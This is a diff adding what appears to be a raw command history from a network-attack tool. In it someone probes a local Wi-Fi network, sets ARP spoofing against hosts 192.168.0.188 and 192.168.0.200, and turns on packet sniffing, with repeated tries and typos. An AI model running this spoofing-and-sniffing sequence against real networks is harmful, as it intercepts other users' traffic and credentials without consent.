@@ -1,0 +1,51 @@
+--iface wlan0
+help
+help net.probe
+net.show
+help arp.spoof
+arp.spoof.targets 192.168.0.188
+arp.spoof.targets192.168.0.188
+arp.spoof.targets 192.168.0.188
+set arp.spoof.duplex true
+set arp.spoof.targets 192.168.0.188
+arp.spoof on
+net.sniff on
+exit
+clear
+net.probe on
+net.show
+set arp.spoof.duplex true
+set arp.spoof.targets 192.168.0.188
+arp.spoof on
+net.probe on
+net.show
+set arp.spoof.duplex true
+set arp.spoof.targets 192.168.0.188
+arp.spoof on
+net.sniff on
+net.show
+set arp.spoof.duplex true
+set arp.spoof.targets 192.168.0.200
+arp.spoof.on
+arp.spoof on
+set arp.spoof.targets 192.168.0.200
+arp.spoof on
+net.sniff on\
+clear
+exit
+net.show
+help
+net.probe
+help net.probe
+net.probe on
+help
+net.show
+clear
+help
+help net.probe
+net.probe on
+help
+net.show
+help arp.spoof
+net.show
+ifconfig
